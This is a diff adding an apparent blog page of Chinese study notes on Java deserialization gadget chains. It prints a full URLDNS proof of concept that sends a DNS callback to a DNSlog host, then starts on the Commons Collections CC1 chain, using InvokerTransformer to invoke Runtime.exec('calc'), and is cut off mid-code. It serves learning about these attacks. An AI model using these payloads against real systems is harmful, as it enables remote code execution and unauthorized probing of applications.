@@ -1,0 +1,1112 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 在学习了反射、基础反序列化、JVM类加载器、JDK动态代理之后，打算先进行反序列化链的学习，然后遇到什么不会的就再回头去学 URLDNS链">
+<title>Java反序列化</title>
+
+<link rel='canonical' href='http://localhost:1313/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Java反序列化">
+<meta property='og:description' content="前言 在学习了反射、基础反序列化、JVM类加载器、JDK动态代理之后，打算先进行反序列化链的学习，然后遇到什么不会的就再回头去学 URLDNS链">
+<meta property='og:url' content='http://localhost:1313/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+<meta property='og:site_name' content='liernian'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-07-22T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-07-22T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Java反序列化">
+<meta name="twitter:description" content="前言 在学习了反射、基础反序列化、JVM类加载器、JDK动态代理之后，打算先进行反序列化链的学习，然后遇到什么不会的就再回头去学 URLDNS链">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💯</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">liernian</a></h1>
+            <h2 class="site-description">理想主义的中二少年</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/en/" >English</option>
+                                
+                                    <option value="http://localhost:1313/" selected>简体中文</option>
+                                
+                                    <option value="http://localhost:1313/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#urldns链">URLDNS链</a>
+      <ol>
+        <li><a href="#链子以及解析">链子以及解析</a></li>
+        <li><a href="#代码实现">代码实现</a></li>
+      </ol>
+    </li>
+    <li><a href="#cc1">CC1</a>
+      <ol>
+        <li><a href="#链子以及解析-1">链子以及解析</a></li>
+        <li><a href="#代码实现-1">代码实现</a></li>
+        <li><a href="#小结">小结</a></li>
+      </ol>
+    </li>
+    <li><a href="#cc6">CC6</a>
+      <ol>
+        <li><a href="#链子以及解析-2">链子以及解析</a></li>
+        <li><a href="#代码实现-2">代码实现</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+            <a href="/categories/java/" >
+                Java
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Java反序列化</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-07-22</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 8 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言
+</h2><p>在学习了反射、基础反序列化、JVM类加载器、JDK动态代理之后，打算先进行反序列化链的学习，然后遇到什么不会的就再回头去学</p>
+<h2 id="urldns链">URLDNS链
+</h2><p>URLDNS链是Java反序列化中用于检测反序列化漏洞的一条利用链。它并不是一个真正的“利用”链，因为它并不能执行代码，而是用于检测目标是否存在反序列化漏洞。</p>
+<p>它具有以下特点：</p>
+<ol>
+<li>不依赖任何第三方库，只使用JDK内置类。</li>
+<li>利用过程会触发一次DNS查询，因此可以通过监控DNS请求来确认漏洞存在。</li>
+</ol>
+<h3 id="链子以及解析">链子以及解析
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HashMap.readObject()
+</span></span><span class="line"><span class="cl">|
+</span></span><span class="line"><span class="cl">V
+</span></span><span class="line"><span class="cl">URL.hashCode()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>首先是入口点：<code>HashMap.readObject()</code></p>
+<p>当你反序列化一个 <code>HashMap</code> 对象时，它的 <code>readObject()</code> 方法会被自动调用。在这个方法内部，为了将序列化数据中的每一个键值对（Key-Value Pair）恢复到 <code>HashMap</code> 的内部结构（一个哈希表）中，它需要对<strong>每一个 Key</strong> 调用 <code>hashCode()</code> 方法来计算其哈希值。</p>
+<p>接下来是URL的hashCode()方法</p>
+<p><code>URL.hashCode()</code> 首先会检查内部一个 <code>hashCode</code> 字段是否已经被计算过。如果没计算过（默认是-1），它就会调用 <code>handler.hashCode(this)</code> 来计算。</p>
+<p>然后<code>handler.hashCode(URL u)</code> 方法会调用 <code>java.net.InetAddress.getByName(u.getHost())</code> 来获取 URL 中主机的 IP 地址。<code>InetAddress.getByName</code>会发起一次 DNS 查询来解析这个域名。</p>
+<p>这样就会触发DNS请求了。</p>
+<p>知道原理后，就可以试着自己构造一下序列化文件了</p>
+<h3 id="代码实现">代码实现
+</h3><p>这里通过反射修改了hashCode字段的值，在创建HashMap并放入URL对象时，因为hashCode经过我们的修改，不为-1，便不会进行DNS请求。</p>
+<p>之后在序列化之前再重置为-1，这样使得目标主机发起一次DNS查询。</p>
+<p>（这样做可以区分开DNSlog上收到的记录到底时目标靶机还是自己靶机上的）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serializable</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">path</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="n">path</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">deserializable</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">path</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">path</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//目标 URL，指向 DNSLog 服务器（这里用的是 Ceye.io，功能类似）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">URL</span><span class="w"> </span><span class="n">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="s">&#34;http://2fu4td.ceye.io&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//通过反射获取 URL 类内部私有的 hashCode 字段</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">hashCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">URL</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;hashCode&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashCode</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  </span><span class="c1">//解除访问禁止</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 强制将 URL 对象 u 的内部 hashCode 字段设置为一个非 -1 的值</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashCode</span><span class="p">.</span><span class="na">setInt</span><span class="p">(</span><span class="n">u</span><span class="p">,</span><span class="n">23</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//创建 HashMap 并安全地放入 URL 对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">URL</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">u</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//在序列化之前，将 URL 对象 u 的内部 hashCode 字段重置为 -1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashCode</span><span class="p">.</span><span class="na">setInt</span><span class="p">(</span><span class="n">u</span><span class="p">,</span><span class="o">-</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serializable</span><span class="p">(</span><span class="s">&#34;url.bin&#34;</span><span class="p">,</span><span class="n">map</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">deserializable</span><span class="p">(</span><span class="s">&#34;url.bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果如下</p>
+<p><img src="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250724171041390.png"
+	width="1444"
+	height="960"
+	srcset="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250724171041390_hu7567478207984572817.png 480w, /p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250724171041390_hu11763667315150185274.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250724171041390"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="150"
+		data-flex-basis="361px"
+	
+></p>
+<p><img src="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250724165727547.png"
+	width="2316"
+	height="604"
+	srcset="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250724165727547_hu9913159218425826515.png 480w, /p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250724165727547_hu4161318642237223194.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250724165727547"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="383"
+		data-flex-basis="920px"
+	
+></p>
+<h2 id="cc1">CC1
+</h2><p>Apache Commons Collections 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。</p>
+<p>CC1 链是利用了 Apache Commons Collections 库中的一系列类，将它们串联起来，最终在目标应用反序列化我们构造的恶意对象时，执行任意的系统命令。</p>
+<h3 id="链子以及解析-1">链子以及解析
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AnnotationInvocationHandler 
+</span></span><span class="line"><span class="cl">|
+</span></span><span class="line"><span class="cl">V
+</span></span><span class="line"><span class="cl">LazyMap/TransformedMap
+</span></span><span class="line"><span class="cl">|
+</span></span><span class="line"><span class="cl">V
+</span></span><span class="line"><span class="cl">Transformer
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从尾巴开始解析：<code>InvokerTransformer</code></p>
+<p>它实现了<code>org.apache.commons.collections.Transformer</code>接口，这个接口只有一个<code>transform(Object input)</code>方法，这个方法通过反射获取可控的传入对象以及该对象的指定方法。然后调用这个方法并返回。</p>
+<p>既然可控，那么就可以传入Runtime对象,并指定exec方法。具体利用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">构造一个new</span><span class="w"> </span><span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">然后调用transform</span><span class="p">()</span><span class="n">方法</span><span class="err">，</span><span class="n">并传入一个Runtime对象就可以执行Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">具体代码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//详细解释一下：InvokerTransformer配置为寻找一个名为 exec 的方法，这个方法接受一个 String 类型的参数。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//当它的 transform() 方法被调用时，它会执行 input.exec(&#34;calc&#34;)。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//input 是 transform() 方法接收到的参数。</span><span class="w">
